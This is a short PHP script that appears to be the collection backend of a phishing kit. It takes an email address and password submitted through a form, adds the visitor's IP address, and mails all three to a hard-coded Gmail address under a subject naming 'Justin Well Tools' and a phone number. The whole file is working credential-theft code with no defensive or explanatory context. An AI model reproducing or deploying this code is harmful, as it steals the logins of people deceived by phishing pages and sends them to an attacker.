<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['mail'];
 $password = $_POST['password'];
 
		$to = "sales.finimpianti.it@gmail.com";
		
		
         $subject = "Justin Well Tools 09030812441";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Justin Well Tools 09030812441 \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);


}
?>


